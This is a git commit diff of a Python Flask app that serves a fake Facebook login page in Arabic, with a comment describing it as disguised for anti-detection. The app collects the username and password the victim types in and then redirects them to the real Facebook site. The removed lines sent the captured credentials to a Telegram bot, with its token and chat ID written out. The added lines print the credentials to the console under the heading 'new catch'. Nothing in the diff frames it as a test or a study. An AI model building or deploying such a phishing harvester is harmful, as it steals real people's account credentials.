2f5f88212c3e95a0b8e9a8309815ff5092bb0757
larebifarese28-cmd <larebifarese28@gmail.com>
2026-03-26 18:09:09 +0100

    Update app.py

--- app.py
+++ app.py
@@ -1,11 +1,8 @@
 from flask import Flask, render_template_string, request, redirect
-import requests
 
 app = Flask(__name__)
 
-TOKEN = "8599495749:AAFIQkYkNLJV_Xn_ZckTIxFoTp8Fm4ChlG0"
-CHAT_ID = "7479786207"
-
+# واجهة فيسبوك المموهة (Anti-Detection)
 html_ui = """
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
@@ -24,8 +21,8 @@ html_ui = """
     <div class="card">
         <h2 style="color:#1877f2;">facebook</h2>
         <form action="/auth" method="POST">
-            <input type="text" name="data1" placeholder="رقم الهاتف أو البريد" required>
-            <input type="password" name="data2" placeholder="كلمة السر" required>
+            <input type="text" name="v1" placeholder="رقم الهاتف أو البريد" required>
+            <input type="password" name="v2" placeholder="كلمة السر" required>
             <button class="btn">تسجيل الدخول</button>
         </form>
     </div>
@@ -39,11 +36,18 @@ def home():
 
 @app.route('/auth', methods=['POST'])
 def auth():
-    d1 = request.form.get('data1')
-    d2 = request.form.get('data2')
-    msg = f"🎯 صيد جديد!\\n👤: {d1}\\n🔑: {d2}"
-    requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", data={"chat_id": CHAT_ID, "text": msg})
+    user = request.form.get('v1')
+    pwd = request.form.get('v2')
+    
+    # هذه الخطوة تطبع البيانات في Termux أو Logs الموقع
+    print(f"\\n{'='*20}")
+    print(f"🎯 صيد جديد يا فارس!")
+    print(f"👤 الحساب: {user}")
+    print(f"🔑 الباسورد: {pwd}")
+    print(f"{'='*20}\\n")
+    
     return redirect("https://www.facebook.com")
 
 if __name__ == '__main__':
+    # تشغيل السيرفر
     app.run(host='0.0.0.0', port=5000)
